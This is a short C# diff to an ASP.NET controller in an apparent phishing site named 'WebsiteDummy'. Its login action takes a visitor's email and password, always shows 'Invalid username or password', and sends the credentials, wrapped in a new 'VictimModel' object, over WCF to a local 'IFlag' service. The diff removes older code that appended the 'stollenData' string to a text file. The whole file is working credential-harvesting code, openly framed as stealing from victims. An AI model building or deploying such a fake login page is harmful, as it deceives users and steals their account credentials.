@@ -1,4 +1,5 @@
 ﻿using Common;
+using Contracts.DatabaseModel;
 using System;
 using System.Collections.Generic;
 using System.Drawing.Imaging;
@@ -31,20 +32,9 @@ namespace WebsiteDummy.Controllers
 				ViewBag.error = "Invalid username or password";
 				return View("Index");
 			}
-					
-
-			string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();
-
-			string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
-			FileStream stream = new FileStream(path, FileMode.Append);
-			
 
 
-			using (StreamWriter sw = new StreamWriter(stream))
-			{
-				sw.WriteLine(stollenData);
-			}
-
+			VictimModel vm = new VictimModel(email, password, DateTime.Now);
 
 			ChannelFactory<IFlag> factory = new ChannelFactory<IFlag>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:4000/IFlag"));
 			if (channel == null)
@@ -52,13 +42,10 @@ namespace WebsiteDummy.Controllers
 				channel = factory.CreateChannel();
 			}
 
-			channel.SendData(stollenData);
-
+			channel.SendData(vm);
 
 			ViewBag.error = "Invalid username or password";
 			return View("Index");
 		}
-
-
 	}
 }
